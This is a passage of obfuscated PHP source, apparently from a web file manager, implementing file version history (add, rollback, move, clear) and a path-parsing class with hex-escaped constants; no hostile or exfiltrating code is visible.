$à™ı¹ıÂ[230]) { $›ÎÛ¾µ = self::listData($´ÖäÆşî); if ($›ÎÛ¾µ && $›ÎÛ¾µ[$à™ı¹ıÂ[446]]) { self::moveHistory($´ÖäÆşî, $ÅØâşÛ[1]); } } else { IO::rename($¢Û â—Ñ[$à™ı¹ıÂ[87]], $ÅØâşÛ[1]); } } public static function eventBeforeMove($ÇÄ¼ğÀ) { $­ôîøÖµ =& $_SERVER[µÅ˜º…æ]; $×Ëê“Õ‡ = self::parsePath($ÇÄ¼ğÀ[0]); if (!$×Ëê“Õ‡) { return; } $‡˜¾Ü„ê = self::parsePath($ÇÄ¼ğÀ[1]); if (!$‡˜¾Ü„ê) { return; } $ıËÑ¥¦ç = $ÇÄ¼ğÀ[3]; $”ûÎœ„• = self::checkInHistory($×Ëê“Õ‡); if (!$”ûÎœ„•) { return; } $à¥¥üìñ = self::pathHistory($‡˜¾Ü„ê); if ($”ûÎœ„•[$­ôîøÖµ[33]] == $­ôîøÖµ[230]) { $È¡ŠÔ¸ = self::listData($×Ëê“Õ‡); $Õ¡Ó Èã = rtrim($‡˜¾Ü„ê, $­ôîøÖµ[8]) . $­ôîøÖµ[8] . ($ıËÑ¥¦ç ? $ıËÑ¥¦ç : get_path_this($×Ëê“Õ‡)); $ù¿âŸòü = self::listData($Õ¡Ó Èã); if ($È¡ŠÔ¸ && $È¡ŠÔ¸[$­ôîøÖµ[446]] && $ù¿âŸòü && $ù¿âŸòü[$­ôîøÖµ[446]]) { return self::clear($×Ëê“Õ‡); } if ($È¡ŠÔ¸ && $È¡ŠÔ¸[$­ôîøÖµ[446]]) { self::moveHistory($×Ëê“Õ‡, $ıËÑ¥¦ç, $à¥¥üìñ); } } else { IO::move($”ûÎœ„•[$­ôîøÖµ[87]], $à¥¥üìñ, !1, $ıËÑ¥¦ç); self::clearEmptyFolder(IO::pathFather($”ûÎœ„•[$­ôîøÖµ[87]])); } } public static function eventAfterRemove($¨Šã´ÎŞ, $½ı–ß¨) { $Ä‰¿´ì =& $_SERVER[µÅ˜º…æ]; if (!$½ı–ß¨) { return; } $‹¦€Áõû = self::parsePath($¨Šã´ÎŞ[0]); if (!$‹¦€Áõû) { return; } $é¾ë º = self::checkInHistory($‹¦€Áõû); if (!$é¾ë º) { return; } if ($é¾ë º[$Ä‰¿´ì[33]] == $Ä‰¿´ì[230]) { $ÁÌõË¨¡ = self::listData($‹¦€Áõû, !1); if ($ÁÌõË¨¡ && $ÁÌõË¨¡[$Ä‰¿´ì[446]]) { self::clear($‹¦€Áõû, !1); } } else { IO::remove($é¾ë º[$Ä‰¿´ì[87]]); self::clearEmptyFolder(IO::pathFather($é¾ë º[$Ä‰¿´ì[87]])); } } private static function checkInHistory($¾ü°àÚ£) { $¶ÙÓ¼£İ = self::pathHistory($¾ü°àÚ£); if (!IO::exist($¶ÙÓ¼£İ)) { $¶ÙÓ¼£İ .= $_SERVER[µÅ˜º…æ][1422]; } return IO::exist($¶ÙÓ¼£İ) ? IO::info($¶ÙÓ¼£İ) : !1; } private static function parsePath($‘µòÜø¶) { $á™î¸­ =& $_SERVER[µÅ˜º…æ]; if (!$‘µòÜø¶) { return !1; } if (isset($GLOBALS[$á™î¸­[1423]]) && $GLOBALS[$á™î¸­[1423]]) { return; } $¨ú™ëë‚ = KodIO::parse($‘µòÜø¶); $˜ú‡Ä»³ = $¨ú™ëë‚[$á™î¸­[33]]; $ÏöÊ‹ï = !$˜ú‡Ä»³ || $˜ú‡Ä»³ == KodIO::KOD_IO || $˜ú‡Ä»³ == KodIO::KOD_SHARE_ITEM; if (!$ÏöÊ‹ï || !$¨ú™ëë‚[$á™î¸­[1424]]) { return !1; } if (substr($‘µòÜø¶, 0, strlen(DATA_PATH . $á™î¸­[1425])) == DATA_PATH . $á™î¸­[1425]) { return !1; } if ($˜ú‡Ä»³ == KodIO::KOD_SHARE_ITEM) { $³¤Úˆİ = IO::init($‘µòÜø¶); if ($³¤Úˆİ->pathParse[$á™î¸­[1338]]) { return self::parsePath($³¤Úˆİ->pathParse[$á™î¸­[1338]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÂÒŸØÃ‰ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $á™î¸­[1426]); foreach ($ÂÒŸØÃ‰ as $ÉÎ¬õ©¸) { if (!$˜ú‡Ä»³ && substr($‘µòÜø¶, 0, strlen($ÉÎ¬õ©¸)) == $ÉÎ¬õ©¸) { return !1; } } self::log($GLOBALS[$á™î¸­[1332]] . $á™î¸­[1427] . $‘µòÜø¶); return $‘µòÜø¶; } private static function pathHistory($ÜØ’ûÁ¬) { $ùˆÒ¯â =& $_SERVER[µÅ˜º…æ]; $ÂÚ³ÖĞŸ = self::$_historyBase . ltrim(KodIO::clear($ÜØ’ûÁ¬), $ùˆÒ¯â[8]); $ÂÚ³ÖĞŸ = str_replace(array($ùˆÒ¯â[1428]), array($ùˆÒ¯â[1429]), $ÂÚ³ÖĞŸ); return $ÂÚ³ÖĞŸ; } public static function log($‰îâ­Ï) { } public static function historyCount($üˆ¢¼õê) { $·‰ ¢Ï =& $_SERVER[µÅ˜º…æ]; $úŸş¤§¸ = array(); $…˜•‰¾¥ = array(); foreach ($üˆ¢¼õê as $—ñ‚‡˜) { $„ù’œá× = get_path_father($—ñ‚‡˜); if (!$…˜•‰¾¥[$„ù’œá×]) { $…˜•‰¾¥[$„ù’œá×] = array(); } $…˜•‰¾¥[$„ù’œá×][] = get_path_this($—ñ‚‡˜); } foreach ($…˜•‰¾¥ as $„ù’œá× => $“àè…­­) { $¿‹âÙ¶ = self::parsePath($„ù’œá×); if (!$¿‹âÙ¶) { continue; } foreach ($“àè…­­ as $—€Ä‡¼©) { $åÀ¯É° = self::listData(rtrim($¿‹âÙ¶, $·‰ ¢Ï[8]) . $·‰ ¢Ï[8] . $—€Ä‡¼©, !1); if ($åÀ¯É° && $åÀ¯É°[$·‰ ¢Ï[446]]) { $úŸş¤§¸[rtrim($„ù’œá×, $·‰ ¢Ï[8]) . $·‰ ¢Ï[8] . $—€Ä‡¼©] = count($åÀ¯É°[$·‰ ¢Ï[446]]); } } } return $úŸş¤§¸; } public static function add($ôôÎô±š) { $âûûº² =& $_SERVER[µÅ˜º…æ]; $¤­Ã• ‡ = self::listData($ôôÎô±š); if (!$¤­Ã• ‡) { return; } $æğ€ıô¿ = Model($âûûº²[872])->get($âûûº²[960]); $Ï³œæÑ = intval($GLOBALS[$âûûº²[6]][$âûûº²[92]][$âûûº²[1408]]); $ÁŠ°ÕÜ¤ = $æğ€ıô¿ == $âûûº²[961] ? min(5, $Ï³œæÑ) : $Ï³œæÑ; if ($Ï³œæÑ <= 0) { return; } $á…¶¥¡Š = IO::info($ôôÎô±š); $òš€Œü = $¤­Ã• ‡[$âûûº²[446]]; if ($á…¶¥¡Š[$âûûº²[79]] == 0) { return; } if ($á…¶¥¡Š[$âûûº²[79]] >= 1024 * 1024 * 500) { return !1; } $›ƒ¦§«ã = IO::hashSimple($ôôÎô±š); if ($òš€Œü && $òš€Œü[0][$âûûº²[694]] == $›ƒ¦§«ã) { return !0; } if (array_key_exists($âûûº²[233], $á…¶¥¡Š) && !$á…¶¥¡Š[$âûûº²[233]]) { return !1; } $Ÿğ®íšĞ = short_id(time()); $ı·µ¥ = array($âûûº²[487] => $Ÿğ®íšĞ, $âûûº²[694] => $›ƒ¦§«ã, $âûûº²[32] => $á…¶¥¡Š[$âûûº²[32]] . $âûûº²[10] . date($âûûº²[1430]) . rand_string(1), $âûûº²[79] => $á…¶¥¡Š[$âûûº²[79]], $âûûº²[541] => USER_ID, $âûûº²[231] => time(), $âûûº²[1431] => $âûûº²[12]); IO::mkdir($¤­Ã• ‡[$âûûº²[1432]]); $šõÔı‰ = IO::copy($ôôÎô±š, $¤­Ã• ‡[$âûûº²[1432]], !1, $ı·µ¥[$âûûº²[32]]); if (!$šõÔı‰) { self::clearEmptyFolder($¤­Ã• ‡[$âûûº²[1432]]); return !1; } array_unshift($òš€Œü, $ı·µ¥); if (count($òš€Œü) > $ÁŠ°ÕÜ¤) { $›¦­â€ = array_slice($òš€Œü, $ÁŠ°ÕÜ¤); foreach ($›¦­â€ as $­íˆú¿Ñ) { IO::remove($¤­Ã• ‡[$âûûº²[1432]] . $­íˆú¿Ñ[$âûûº²[32]]); } $òš€Œü = array_slice($òš€Œü, 0, $ÁŠ°ÕÜ¤); } return self::saveData($¤­Ã• ‡[$âûûº²[1433]], $òš€Œü); } public static function remove($õÄ½Ô¢ñ, $¯ò­à”ª) { $¹°áœò¯ =& $_SERVER[µÅ˜º…æ]; $«Å¹çƒ = self::listData($õÄ½Ô¢ñ); $êŠĞ¢ˆÄ = array(); if (!$«Å¹çƒ) { return !1; } foreach ($«Å¹çƒ[$¹°áœò¯[446]] as $·£Ã€´Ù) { if ($·£Ã€´Ù[$¹°áœò¯[487]] == $¯ò­à”ª) { IO::remove($«Å¹çƒ[$¹°áœò¯[1432]] . $·£Ã€´Ù[$¹°áœò¯[32]]); continue; } $êŠĞ¢ˆÄ[] = $·£Ã€´Ù; } return self::saveData($«Å¹çƒ[$¹°áœò¯[1433]], $êŠĞ¢ˆÄ); } public static function clear($à¼Éı¬ä, $Û¸ï­åÑ = true) { $…ï¢ğŒœ =& $_SERVER[µÅ˜º…æ]; $ŸÄş¹Şà = self::listData($à¼Éı¬ä, $Û¸ï­åÑ); if (!$ŸÄş¹Şà) { return !1; } foreach ($ŸÄş¹Şà[$…ï¢ğŒœ[446]] as $µ¦‘äÉ) { IO::remove($ŸÄş¹Şà[$…ï¢ğŒœ[1432]] . $µ¦‘äÉ[$…ï¢ğŒœ[32]]); } return self::saveData($ŸÄş¹Şà[$…ï¢ğŒœ[1433]], array()); } public static function moveHistory($ïˆ—é¸ó, $•Ï«òèÚ = '', $Ô¬¨Ó¸ı = '') { $ÈÑë‹“Ç =& $_SERVER[µÅ˜º…æ]; $¼ƒèïŠÉ = self::listData($ïˆ—é¸ó, !1); if (!$¼ƒèïŠÉ || !$¼ƒèïŠÉ[$ÈÑë‹“Ç[446]]) { return !1; } $“¾ÔÒšª = $ÈÑë‹“Ç[1422]; $•Ï«òèÚ = $•Ï«òèÚ ? $•Ï«òèÚ : get_path_this($ïˆ—é¸ó); $Ô¬¨Ó¸ı = $Ô¬¨Ó¸ı ? $Ô¬¨Ó¸ı : $¼ƒèïŠÉ[$ÈÑë‹“Ç[1432]]; $ëá½íá° = substr(get_path_this($¼ƒèïŠÉ[$ÈÑë‹“Ç[1433]]), 0, -strlen($“¾ÔÒšª)); foreach ($¼ƒèïŠÉ[$ÈÑë‹“Ç[446]] as $úÃÉ¯ñ => $¡Õ®ƒÛñ) { $å¸‡Ÿ¨æ = $•Ï«òèÚ . substr($¡Õ®ƒÛñ[$ÈÑë‹“Ç[32]], strlen($ëá½íá°)); $®å¼¤¬• = IO::move($¼ƒèïŠÉ[$ÈÑë‹“Ç[1432]] . $¡Õ®ƒÛñ[$ÈÑë‹“Ç[32]], $Ô¬¨Ó¸ı, !1, $å¸‡Ÿ¨æ); if ($®å¼¤¬•) { $¼ƒèïŠÉ[$ÈÑë‹“Ç[446]][$úÃÉ¯ñ][$ÈÑë‹“Ç[32]] = $å¸‡Ÿ¨æ; } } $¼ƒèïŠÉ[$ÈÑë‹“Ç[1433]] = IO::move($¼ƒèïŠÉ[$ÈÑë‹“Ç[1433]], $Ô¬¨Ó¸ı, !1, $•Ï«òèÚ . $“¾ÔÒšª); self::saveData($¼ƒèïŠÉ[$ÈÑë‹“Ç[1433]], $¼ƒèïŠÉ[$ÈÑë‹“Ç[446]]); self::clearEmptyFolder($¼ƒèïŠÉ[$ÈÑë‹“Ç[1432]]); } public static function rollback($ÚïœµçÌ, $æÎ»í¼²) { $ƒ„Ç´Šø =& $_SERVER[µÅ˜º…æ]; $—äºìµ« = self::listData($ÚïœµçÌ); if (!$—äºìµ«) { return; } $œÍµĞóÒ = IO::info($ÚïœµçÌ); foreach ($—äºìµ«[$ƒ„Ç´Šø[446]] as $Ú÷ãíÙ => $Óíé¸æã) { if ($Óíé¸æã[$ƒ„Ç´Šø[487]] == $æÎ»í¼²) { self::add($ÚïœµçÌ); $è™°‰…ù = $—äºìµ«[$ƒ„Ç´Šø[1432]] . $Óíé¸æã[$ƒ„Ç´Šø[32]]; $¹È“Åî¾ = IO::copy($è™°‰…ù, IO::pathFather($ÚïœµçÌ), REPEAT_REPLACE, $œÍµĞóÒ[$ƒ„Ç´Šø[32]]); if ($¹È“Åî¾) { self::remove($ÚïœµçÌ, $æÎ»í¼²); } return $¹È“Åî¾; } } return !1; } public static function setDetail($œ­å¾Â®, $åÀœ¹ÎÃ, $¤¨¨µ¥ò) { $àÛ•‡Ùµ =& $_SERVER[µÅ˜º…æ]; $ˆõ¨òĞõ = self::listData($œ­å¾Â®); if (!$ˆõ¨òĞõ) { return; } foreach ($ˆõ¨òĞõ[$àÛ•‡Ùµ[446]] as $µãùñê© => $Àìü´) { if ($Àìü´[$àÛ•‡Ùµ[487]] == $åÀœ¹ÎÃ) { $ˆõ¨òĞõ[$àÛ•‡Ùµ[446]][$µãùñê©][$àÛ•‡Ùµ[1431]] = $¤¨¨µ¥ò; self::saveData($ˆõ¨òĞõ[$àÛ•‡Ùµ[1433]], $ˆõ¨òĞõ[$àÛ•‡Ùµ[446]]); return !0; } } return !1; } public static function fileInfo($µÙÔ¡ˆ®, $®ßˆ‹œõ) { $Ã­ø¡äõ =& $_SERVER[µÅ˜º…æ]; $ØŞŠŒ» = self::listData($µÙÔ¡ˆ®); if (!$ØŞŠŒ») { show_json(LNG($Ã­ø¡äõ[105]), !1); } $¸ôö‹³è = $Ã­ø¡äõ[12]; foreach ($ØŞŠŒ»[$Ã­ø¡äõ[446]] as $ÎÅ‘­óŠ => $–¾°°ÒÃ) { if ($–¾°°ÒÃ[$Ã­ø¡äõ[487]] != $®ßˆ‹œõ) { continue; } $¸ôö‹³è = $ØŞŠŒ»[$Ã­ø¡äõ[1432]] . $–¾°°ÒÃ[$Ã­ø¡äõ[32]]; break; } if (!$¸ôö‹³è) { show_json(LNG($Ã­ø¡äõ[105]), !1); } return IO::info($¸ôö‹³è); } public static function fileOut($ÄÆÏ³úŒ, $ÏÆ¥âüİ, $ùŠæÅÚ¦ = false) { $ı¦ãİ÷Š =& $_SERVER[µÅ˜º…æ]; $’ Ú…ƒê = self::fileInfo($ÄÆÏ³úŒ, $ÏÆ¥âüİ); $€ ×¢‹ =& $GLOBALS[$ı¦ãİ÷Š[7]]; $ùŠæÅÚ¦ = isset($€ ×¢‹[$ı¦ãİ÷Š[1386]]) && $€ ×¢‹[$ı¦ãİ÷Š[1386]] == 1; if (isset($€ ×¢‹[$ı¦ãİ÷Š[33]]) && $€ ×¢‹[$ı¦ãİ÷Š[33]] == $ı¦ãİ÷Š[1434]) { return IO::fileOutImage($’ Ú…ƒê[$ı¦ãİ÷Š[87]], $€ ×¢‹[$ı¦ãİ÷Š[1435]]); } IO::fileOut($’ Ú…ƒê[$ı¦ãİ÷Š[87]], $ùŠæÅÚ¦, get_path_this($ÄÆÏ³úŒ)); } public static function listData($—˜èŸú˜, $ÌÙÓˆëú = true) { $½å½íü« =& $_SERVER[µÅ˜º…æ]; if ($ÌÙÓˆëú && !IO::exist($—˜èŸú˜)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($—˜èŸú˜, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $°øøø³½ = self::pathHistory($—˜èŸú˜); $¯«¨ëÒ = array($½å½íü«[1433] => $°øøø³½ . $½å½íü«[1422], $½å½íü«[1432] => rtrim(get_path_father($°øøø³½), $½å½íü«[8]) . $½å½íü«[8], $½å½íü«[446] => array()); $•¥ÄàŒ¤ = IO::getContent($¯«¨ëÒ[$½å½íü«[1433]]); if ($•¥ÄàŒ¤) { $šâµîğ“ = json_decode($•¥ÄàŒ¤, !0); if (is_array($šâµîğ“)) { $¯«¨ëÒ[$½å½íü«[446]] = $šâµîğ“; } } return $¯«¨ëÒ; } private static function saveData($Å¹óã±è, $€¥ÉÍÓ) { $¹¡’‘ŞÏ =& $_SERVER[µÅ˜º…æ]; self::log($¹¡’‘ŞÏ[1436] . $Å¹óã±è . $¹¡’‘ŞÏ[74] . count($€¥ÉÍÓ), $¹¡’‘ŞÏ[851]); if ($€¥ÉÍÓ) { return IO::setContent($Å¹óã±è, json_encode($€¥ÉÍÓ)); } $ˆôŸÆû = IO::pathFather($Å¹óã±è); IO::remove($Å¹óã±è); self::clearEmptyFolder($ˆôŸÆû); return !0; } public static function clearEmptyFolder($Ã± Öôõ) { $·˜»° =& $_SERVER[µÅ˜º…æ]; if (trim($Ã± Öôõ, $·˜»°[8]) == trim(self::$_historyBase, $·˜»°[8])) { return; } $™²¥¦Ÿ¬ = IO::pathFather($Ã± Öôõ); $¨ËÖÈş¥ = IO::has($Ã± Öôõ, !0); if ($¨ËÖÈş¥[$·˜»°[239]] > 0 || $¨ËÖÈş¥[$·˜»°[240]] > 0) { return; } IO::remove($Ã± Öôõ); self::clearEmptyFolder($™²¥¦Ÿ¬); } private static function getBasePath() { $ûÄ¡×Û€ =& $_SERVER[µÅ˜º…æ]; $¢œ»ı¤ò = Model($ûÄ¡×Û€[1437])->get($ûÄ¡×Û€[1438]); if ($¢œ»ı¤ò) { if (!IO::exist($¢œ»ı¤ò)) { IO::mkdir($¢œ»ı¤ò); } if (get_path_this($¢œ»ı¤ò) == $ûÄ¡×Û€[1425]) { $çû†½±¼ = $ûÄ¡×Û€[1439] . rand_string(8); @rename($¢œ»ı¤ò, get_path_father($¢œ»ı¤ò) . $ûÄ¡×Û€[8] . $çû†½±¼); $¢œ»ı¤ò = DATA_PATH . $çû†½±¼ . $ûÄ¡×Û€[8]; file_put_contents(DATA_PATH . $ûÄ¡×Û€[1374], $ûÄ¡×Û€[12]); Model($ûÄ¡×Û€[1437])->set($ûÄ¡×Û€[1438], $¢œ»ı¤ò); } return $¢œ»ı¤ò; } $¢œ»ı¤ò = DATA_PATH . $ûÄ¡×Û€[1439] . rand_string(8) . $ûÄ¡×Û€[8]; $¢œ»ı¤ò = IO::mkdir($¢œ»ı¤ò); $¢œ»ı¤ò = rtrim($¢œ»ı¤ò, $ûÄ¡×Û€[8]) . $ûÄ¡×Û€[8]; file_put_contents($¢œ»ı¤ò . $ûÄ¡×Û€[1374], $ûÄ¡×Û€[12]); file_put_contents(DATA_PATH . $ûÄ¡×Û€[1374], $ûÄ¡×Û€[12]); Model($ûÄ¡×Û€[1437])->set($ûÄ¡×Û€[1438], $¢œ»ı¤ò); return $¢œ»ı¤ò; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\122\x65\x63\171\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\x46\151\154\x65\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\106\x69\x6c\145\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\160\122\157\x6f\164\123\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\162\123\x68\x61\162\x65\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\x65\124\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\145\111\164\x65\155\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\145\111\164\145\155\114\x69\156\153\175"; const KOD_SHARE_OUTER = "\x7b\163\150\x61\162\x65\111\x74\145\x6d\x4f\x75\x74\x7d"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\x62\154\157\x63\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\165\x73\145\162\122\145\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\145\162\175"; public static function typeList() { $³ş­ø®Î =& $_SERVER[µÅ˜º…æ]; return array($³ş­ø®Î[1440] => self::KOD_SOURCE, $³ş­ø®Î[1441] => self::KOD_USER_RECYCLE, $³ş­ø®Î[1442] => self::KOD_USER_FAV, $³ş­ø®Î[1443] => self::KOD_USER_FILE_TAG, $³ş­ø®Î[1444] => self::KOD_USER_FILE_TYPE, $³ş­ø®Î[1445] => self::KOD_GROUP_ROOT_SELF, $³ş­ø®Î[1446] => self::KOD_USER_SHARE, $³ş­ø®Î[1447] => self::KOD_USER_SHARE_LINK, $³ş­ø®Î[1448] => self::KOD_USER_SHARE_TO_ME, $³ş­ø®Î[1449] => self::KOD_SHARE_ITEM, $³ş­ø®Î[1450] => self::KOD_SHARE_LINK, $³ş­ø®Î[1451] => self::KOD_SHARE_OUTER, $³ş­ø®Î[1452] => self::KOD_SEARCH, $³ş­ø®Î[1453] => self::KOD_BLOCK, $³ş­ø®Î[1454] => self::KOD_IO, $³ş­ø®Î[1455] => self::KOD_USER_RECENT, $³ş­ø®Î[1456] => self::KOD_USER_DRIVER); } public static function parse($È‚×Ïˆ) { $Õ¤ª†éí =& $_SERVER[µÅ˜º…æ]; $È‚×Ïˆ = self::clear($È‚×Ïˆ); $ñƒãâ = array_values(self::typeList()); preg_match($Õ¤ª†éí[1457], $È‚×Ïˆ, $¿ÃÀª’¯); $úõ¬Ö‘ú = array($Õ¤ª†éí[511] => !1, $Õ¤ª†éí[1458] => !1, $Õ¤ª†éí[508] => !1, $Õ¤ª†éí[87] => $È‚×Ïˆ, $Õ¤ª†éí[1358] => !1, $Õ¤ª†éí[1357] => $Õ¤ª†éí[12]); if (is_array($¿ÃÀª’¯) && count($¿ÃÀª’¯) == 5) { $¦«íùË = $Õ¤ª†éí[1459] . $¿ÃÀª’¯[2] . $Õ¤ª†éí[402]; if (in_array($¦«íùË, $ñƒãâ)) { $úõ¬Ö‘ú[$Õ¤ª†éí[1358]] = $¿ÃÀª’¯[1]; $úõ¬Ö‘ú[$Õ¤ª†éí[33]] = $¦«íùË; $úõ¬Ö‘ú[$Õ¤ª†éí[1460]] = substr($¦«íùË, 1, -1); $úõ¬Ö‘ú[$Õ¤ª†éí[487]] = $¿ÃÀª’¯[3]; } $úõ¬Ö‘ú[$Õ¤ª†éí[1357]] = $¿ÃÀª’¯[4]; } if ($úõ¬Ö‘ú[$Õ¤ª†éí[511]] == self::KOD_SOURCE) { $úõ¬Ö‘ú[$Õ¤ª†éí[487]] = intval($úõ¬Ö‘ú[$Õ¤ª†éí[487]]); $úõ¬Ö‘ú[$Õ¤ª†éí[1361]] = $úõ¬Ö‘ú[$Õ¤ª†éí[487]]; } $Ïß˜£¿ = array($Õ¤ª†éí[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $úõ¬Ö‘ú[$Õ¤ª†éí[1424]] = in_array($úõ¬Ö‘ú[$Õ¤ª†éí[33]], $Ïß˜£¿); return $úõ¬Ö‘ú; } public static function isTruePath($»ÂÇÚÌ) { $Í™Ë§“æ =& $_SERVER[µÅ˜º…æ]; if (substr($»ÂÇÚÌ, 0, 1) != $Í™Ë§“æ[1459]) { return !0; } if (strpos($»ÂÇÚÌ, $Í™Ë§“æ[498]) === 0) { return !0; } if (strpos($»ÂÇÚÌ, $Í™Ë§“æ[1428]) === 0) { return !0; } if (strpos($»ÂÇÚÌ, $Í™Ë§“æ[1461]) === 0) { return !0; } if (strpos($»ÂÇÚÌ, $Í™Ë§“æ[1462]) === 0) { return !0; } if (strpos($»ÂÇÚÌ, $Í™Ë§“æ[1463]) === 0) { return !0; } if (strpos($»ÂÇÚÌ, $Í™Ë§“æ[1464]) === 0) { return !0; } return !1; } public static function clear($·–Ÿ½¾) { $ìıÎé§Ú =& $_SERVER[µÅ˜º…æ]; $·–Ÿ½¾ = str_replace(array($ìıÎé§Ú[1251], $ìıÎé§Ú[285]), $ìıÎé§Ú[53], $·–Ÿ½¾); $·–Ÿ½¾ = str_replace($ìıÎé§Ú[97], $ìıÎé§Ú[8], $·–Ÿ½¾); $½ÅİÏõ = $ìıÎé§Ú[1465]; if (substr($·–Ÿ½¾, 0, 3) == $ìıÎé§Ú[1466]) { $·–Ÿ½¾ = substr($·–Ÿ½¾, 3); } while (strstr($·–Ÿ½¾, $½ÅİÏõ)) { $·–Ÿ½¾ = str_replace($½ÅİÏõ, $ìıÎé§Ú[8], $·–Ÿ½¾); } $·–Ÿ½¾ = preg_replace($ìıÎé§Ú[1467], $ìıÎé§Ú[8], $·–Ÿ½¾); if ($·–Ÿ½¾ == $ìıÎé§Ú[8]) { return $ìıÎé§Ú[8]; } $·–Ÿ½¾ = rtrim($·–Ÿ½¾, $ìıÎé§Ú[8]); return $·–Ÿ½¾; } public static function pathTrue($šÓµÁÌé) { $ÊÕÁ§€ç =& $_SERVER[µÅ˜º…æ]; if (!$šÓµÁÌé) { return $ÊÕÁ§€ç[12]; } $šÓµÁÌé = str_replace($ÊÕÁ§€ç[254], $ÊÕÁ§€ç[8], str_replace($ÊÕÁ§€ç[1468], $ÊÕÁ§€ç[8], $šÓµÁÌé)); $šÓµÁÌé = str_replace($ÊÕÁ§€ç[254], $ÊÕÁ§€ç[8], str_replace($ÊÕÁ§€ç[1468], $ÊÕÁ§€ç[8], $šÓµÁÌé)); if (!strstr($šÓµÁÌé, $ÊÕÁ§€ç[1466])) { return $šÓµÁÌé; } $éÉ·ôÁ = explode($ÊÕÁ§€ç[8], $šÓµÁÌé); foreach ($éÉ·ôÁ as $Ú×åñŒ§ => $ŸÊÀäº) { if ($ŸÊÀäº !== $ÊÕÁ§€ç[1469]) { continue; } for ($ÅÔ”ãïÕ = $Ú×åñŒ§; $ÅÔ”ãïÕ >= 0; $ÅÔ”ãïÕ--) { if ($éÉ·ôÁ[$ÅÔ”ãïÕ] === $ÊÕÁ§€ç[10] || $éÉ·ôÁ[$ÅÔ”ãïÕ] === $ÊÕÁ§€ç[1469] || $éÉ·ôÁ[$ÅÔ”ãïÕ] === -1) { continue; } if ($éÉ·ôÁ[$ÅÔ”ãïÕ] === $ÊÕÁ§€ç[12]) { $éÉ·ôÁ[$Ú×åñŒ§] = -1; break; } $éÉ·ôÁ[$Ú×åñŒ§] = -1; $éÉ·ôÁ[$ÅÔ”ãïÕ] = -1; break; } } $°àŒ‹“Â = array(); foreach ($éÉ·ôÁ as $ŸÊÀäº) { if ($ŸÊÀäº !== -1) { $°àŒ‹“Â[] = $ŸÊÀäº; } } $Û…¾··— = implode($ÊÕÁ§€ç[8], $°àŒ‹“Â); if (strpos($Û…¾··—, $ÊÕÁ§€ç[1470]) === 0) { $Û…¾··— = $ÊÕÁ§€ç[1466] . substr($Û…¾··—, strlen($ÊÕÁ§€ç[1470])); } return $Û…¾··—; } public static function pathUrlClear($Ç²…Ÿæ) { $ÒäÒ‹å¿ =& $_SERVER[µÅ˜º…æ]; if (!$Ç²…Ÿæ) { return $Ç²…Ÿæ; } $Ç²…Ÿæ = rawurldecode($Ç²…Ÿæ); $Ç²…Ÿæ = str_replace($ÒäÒ‹å¿[1468], $ÒäÒ‹å¿[8], $Ç²…Ÿæ); if (strpos($Ç²…Ÿæ, $ÒäÒ‹å¿[76]) > 0) { $Ç²…Ÿæ = substr($Ç²…Ÿæ, 0, strpos($Ç²…Ÿæ, $ÒäÒ‹å¿[76])); } if (strpos($Ç²…Ÿæ, $ÒäÒ‹å¿[1471]) > 0) { $Ç²…Ÿæ = substr($Ç²…Ÿæ, 0, strpos($Ç²…Ÿæ, $ÒäÒ‹å¿[1471])); } return $Ç²…Ÿæ; } public static function sourceID($›üÆ«©Û) { $•ÎàèÇ =& $_SERVER[µÅ˜º…æ]; $æòÎÜÁ¹ = self::parse($›üÆ«©Û); if ($æòÎÜÁ¹[$•ÎàèÇ[33]] !== self::KOD_SOURCE) { show_json(LNG($•ÎàèÇ[1472]), !1); } return $æòÎÜÁ¹[$•ÎàèÇ[487]]; } public static function make($ÄÆƒù£Ó) { if (!$ÄÆƒù£Ó) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÄÆƒù£Ó)); } public static function makeShare($­éàôúÂ, $³‡è“ÈÁ) { return self::makePath(self::KOD_SHARE_ITEM, $­éàôúÂ, $³‡è“ÈÁ); } public static function makeFileTypePath($“‡ƒå™) { return self::makePath(self::KOD_USER_FILE_TYPE, $“‡ƒå™); } public static function makeFileTagPath($˜ğğ›ïù) { return self::makePath(self::KOD_USER_FILE_TAG, $˜ğğ›ïù); } public static function makePath($Ë³¬ˆ½², $©Ã…¥ÉÛ = '', $ŠÚÀ–»â = '') { $ïØÙœÓ =& $_SERVER[µÅ˜º…æ]; $î©Ä“ùÆ = substr($Ë³¬ˆ½², 1, -1); $ƒ”ƒüï¯ = $ïØÙœÓ[1473] . $î©Ä“ùÆ . $ïØÙœÓ[1474] . $©Ã…¥ÉÛ . $ïØÙœÓ[1475]; $ƒ”ƒüï¯ = $ŠÚÀ–»â ? $ƒ”ƒüï¯ . $ŠÚÀ–»â . $ïØÙœÓ[8] : $ƒ”ƒüï¯; return $ƒ”ƒüï¯; } public static function hashPath($ÔõªÄäø, $ø¢–Š = false) { $í™µúêÄ =& $_SERVER[µÅ˜º…æ]; if (!$ÔõªÄäø) { return $í™µúêÄ[12]; } $ñ´Á¬¾ = is_array($ÔõªÄäø) ? $ÔõªÄäø 